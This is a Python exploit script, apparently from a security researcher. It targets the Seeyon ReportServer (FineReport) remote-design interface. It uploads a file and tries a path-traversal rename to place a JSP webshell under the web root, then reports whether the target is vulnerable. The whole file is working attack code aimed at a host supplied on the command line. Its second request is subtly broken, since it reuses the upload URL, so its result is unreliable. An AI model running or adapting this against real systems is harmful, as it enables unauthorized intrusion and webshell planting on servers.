#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import sys
import requests
import re
import urllib3

urllib3.disable_warnings()

#检查 webshell 是否上传成功
def check_webshell(webshellurl):
    shelllist = requests.get(url=webshellurl, verify=False)
    if shelllist.status_code == 200:
        return True
    return False    
    
    
def verify(site):
    burp0_url = site + "/seeyonreport/ReportServer?op=fr_remote_design&cmd=design_install_reufile&reuFileName=vulntest.reu&isComplete=false"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36", "Connection": "close", "Content-Type": "application/json", "Accept-Encoding": "gzip"}
    burp0_json={"__CONTENT__": "vulntest123"}
    try:
        r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
    except:
        return False
    
    if r.status_code==404:
        return False

    burp0_url2 = site + "/seeyonreport/ReportServer?op=fr_remote_design&cmd=design_rename_file&newPath=../seeyon/vulntest.jsp&oldPath=reportlets/FineReport.Reuse/vulntest/module.xml"
    try:
        r2 = requests.get(burp0_url, headers=burp0_headers, verify=False)
    except:
        return False

    webshellurl = site+"/seeyonreport/seeyon/vulntest.jsp"
    if check_webshell(webshellurl):
        return webshellurl
    return False

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Winows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 seeyon-ReportServer-fileupload.py ",target)
    data = verify(target)
    if data:
        print("[+]漏洞存在，webshell 地址：", data)
    else:
        print("[-]漏洞不存在")
